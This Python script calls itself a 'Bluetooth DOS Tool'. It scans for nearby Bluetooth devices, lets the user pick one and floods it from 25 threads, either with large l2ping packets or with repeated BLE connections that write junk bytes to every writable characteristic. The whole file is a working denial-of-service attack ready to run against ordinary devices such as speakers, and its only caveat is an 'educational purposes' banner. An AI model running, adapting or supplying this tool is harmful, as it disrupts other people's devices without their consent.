#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import time
import threading
import subprocess
import datetime
from bleak import BleakClient, BleakScanner
import asyncio

# Settings
packagesSize = 600
threadsCount = 25  # Reduced for Raspberry Pi
myDelay = 0.1     # Increased delay

def check_prerequisites():
    if os.geteuid() != 0:
        print("This script must be run as root (sudo)")
        sys.exit(1)
    
    # Check if bluetooth interface is available
    try:
        subprocess.check_output(['hciconfig'], stderr=subprocess.STDOUT)
    except:
        print("No Bluetooth adapter found")
        sys.exit(1)

def writeLog(myLine):
    now = datetime.datetime.now()
    with open('log.txt', 'a') as f:
        f.write(f"{now.strftime('%Y-%m-%d %H:%M:%S')},{myLine}\n")

def l2ping_attack(target_addr):
    while True:
        try:
            cmd = f'l2ping -i hci0 -s {packagesSize} -f {target_addr}'
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(myDelay)
        except:
            continue

async def ble_flood_attack(target_addr):
    while True:
        try:
            async with BleakClient(target_addr, timeout=2.0) as client:
                try:
                    await client.connect()
                    services = await client.get_services()
                    for service in services:
                        for char in service.characteristics:
                            if char.properties.write:
                                try:
                                    await client.write_gatt_char(
                                        char.uuid, 
                                        bytearray([0xFF] * packagesSize), 
                                        response=False
                                    )
                                except:
                                    continue
                finally:
                    await client.disconnect()
        except:
            pass
        await asyncio.sleep(myDelay)

async def main():
    check_prerequisites()
    
    print("\nBluetooth DOS Tool")
    print("ONLY FOR EDUCATIONAL PURPOSES\n")
    print("Press Ctrl+C to exit\n")

    
    
    # Reset Bluetooth adapter
    subprocess.run('hciconfig hci0 reset', shell=True)
    time.sleep(1)

    devices = await BleakScanner.discover()
    if not devices:
        print("No devices found. Make sure target is advertising.")
        sys.exit(1)

    print("\nFound devices:")
    for i, d in enumerate(devices):
        print(f"{i}: {d.address} - {d.name or 'Unknown'}")

    idx = int(input("\nSelect target device number: "))
    target_addr = devices[idx].address
    
    print("\nSelect attack method:")
    print("1: L2CAP Ping Flood (for linux only/needs root/use when device is already playing music)")
    print("2: BLE Connection Flood (for all devices/needs root/use when device is idle)")
    method = int(input("Method: "))

    print(f"\nStarting attack on {target_addr}...")
    writeLog(f"Attack started on {target_addr}")

    try:
        if method == 1:
            threads = []
            for _ in range(threadsCount):
                t = threading.Thread(target=l2ping_attack, args=(target_addr,))
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Keep main thread alive
            while True:
                time.sleep(1)
        else:
            await asyncio.gather(*[ble_flood_attack(target_addr) for _ in range(threadsCount)])

    except KeyboardInterrupt:
        print("\nAttack stopped")
        writeLog("Attack stopped")
        sys.exit(0)

if __name__ == '__main__':
    asyncio.run(main())